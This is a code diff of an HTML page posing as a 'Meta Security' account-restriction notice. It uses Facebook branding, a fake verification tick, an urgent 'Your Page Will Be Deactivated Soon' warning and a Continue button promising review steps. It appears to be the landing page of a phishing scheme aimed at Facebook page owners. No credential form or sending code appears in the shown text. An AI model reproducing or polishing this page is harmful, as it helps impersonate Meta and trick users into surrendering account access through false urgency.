@@ -1,142 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Meta Security | Account Restriction</title>
+  <meta charset="UTF-8">
+  <title>Meta Security Notice</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f0f2f5;
-      margin: 0;
-      padding: 0;
+      background-color: #f1f1f1;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
+      height: 100vh;
     }
-
     .container {
-      background: white;
-      max-width: 400px;
-      margin-top: 60px;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      background-color: #fff;
+      padding: 30px;
+      width: 350px;
       text-align: center;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       position: relative;
     }
-
     .top-logo {
-      position: absolute;
-      top: -50px;
-      left: -50px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      margin-bottom: 20px;
     }
-
     .top-logo img {
-      width: 40px;
+      width: 30px;
+      height: 30px;
+      margin-right: 10px;
     }
-
-    .meta-logo img {
-      width: 60px;
-      margin-bottom: 10px;
+    .main-icon {
+      width: 100px;
+      margin: 20px auto;
     }
-
-    h2 {
-      margin: 10px 0;
+    .heading {
+      font-size: 20px;
+      font-weight: bold;
     }
-
-    h3 {
+    .subheading {
+      font-size: 16px;
+      color: #333;
+    }
+    .tick-text {
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      gap: 5px;
-      margin: 3px 0;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #555;
     }
-
-    .blue-tick {
-      color: #1877f2; /* Facebook blue */
-      font-weight: bold;
-      font-size: 18px;
-      vertical-align: middle;
+    .tick-text img {
+      width: 16px;
+      height: 16px;
+      margin-left: 5px;
     }
-
     .warning {
       color: red;
       font-weight: bold;
+      margin-top: 20px;
+    }
+    .info-text {
+      font-size: 14px;
       margin: 15px 0;
     }
-
-    .description {
-      color: #333;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-
     .btn {
-      padding: 10px 20px;
       background-color: #1877f2;
-      color: white;
-      text-decoration: none;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
       border-radius: 6px;
-      font-weight: bold;
-      display: inline-block;
+      cursor: pointer;
+      font-size: 16px;
     }
-
     .footer-links {
       margin-top: 20px;
       font-size: 12px;
-      color: #555;
     }
-
     .footer-links a {
-      color: #1877f2;
-      text-decoration: none;
       margin: 0 5px;
-    }
-
-    .footer {
-      margin-top: 40px;
-      font-size: 12px;
-      color: #888;
+      color: #555;
+      text-decoration: none;
     }
   </style>
 </head>
 <body>
 
-  <!-- Facebook Logo (top-left) -->
+<div class="container">
   <div class="top-logo">
-    <img src="facebook-logo.png" alt="Facebook Logo" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    <span class="heading">Meta Security</span>
+  </div>
+  <div class="subheading tick-text">
+    Account Restrictions Service
+    <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Blue Tick">
   </div>
 
-  <div class="container">
-    <!-- Meta Logo -->
-    <div class="meta-logo">
-      <img src="meta-logo.png" alt="Meta Logo" />
-    </div>
+  <img src="https://cdn-icons-png.flaticon.com/512/545/545705.png" alt="Main Icon" class="main-icon">
 
-    <h2>Meta Security</h2>
-    </h3>
-<h3>Account Restrictions Service</h3> <img src="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/bluetick.png?v=1737135548362" alt="">
-    <p class="warning">Your Page Will Be Deactivated Soon</p>
-
-    <p class="description">
-      We will walk you through several steps to request a review.<br />
-      You should complete these steps so that your page will not be deleted permanently.
-    </p>
-
-    <a href="#" class="btn">Continue</a>
-
-    <div class="footer-links">
-      <a href="#">Terms of Service</a> |
-      <a href="#">Privacy Policy</a> |
-      <a href="#">Community Standards</a> |
-      <a href="#">Help Center</a>
-    </div>
-
-    <div class="footer">
-      Meta Platforms, Inc. © 2025. All rights reserved.
-    </div>
+  <div class="warning">Your Page Will Be Deactivated Soon</div>
+  <div class="info-text">
+    We will walk you through several steps to request a review.<br>
+    You should complete these steps so that your page will not be deleted permanently.
   </div>
+  <button class="btn">Continue</button>
+
+  <div class="footer-links">
+    <a href="#">Terms of Service</a> |
+    <a href="#">Privacy Policy</a> |
+    <a href="#">Community Standards</a> |
+    <a href="#">Help Center</a>
+  </div>
+</div>
 
 </body>
 </html>
